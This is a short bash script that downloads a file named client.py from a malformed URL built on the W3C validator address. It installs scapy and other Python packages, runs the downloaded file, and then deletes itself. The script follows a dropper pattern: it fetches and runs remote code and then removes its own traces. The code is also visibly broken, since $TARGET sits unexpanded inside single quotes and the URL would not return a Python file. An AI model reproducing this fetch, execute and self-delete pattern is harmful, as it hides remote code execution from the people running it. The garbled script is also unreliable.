#!/bin/bash

# Save the script in the same directory
current_directory=$(pwd)

# download binary to directory
wget -P "$current_directory" 'https://validator.w3.org/check?uri=$TARGET&charset=%28detect+automatically%29&doctype=Inline&group=0&verbose=1/client.py'

# install any dependencies
apt-get install python3-scapy
apt-get install python3-urllib3
apt-get install python3-bs4
#pip3 intsall ...

# if download was successful...
if [ $? -eq 0 ]; then
    # execute
    cd $current_directory
    python3 client.py

    # self destruct
    rm -f "$0"
fi
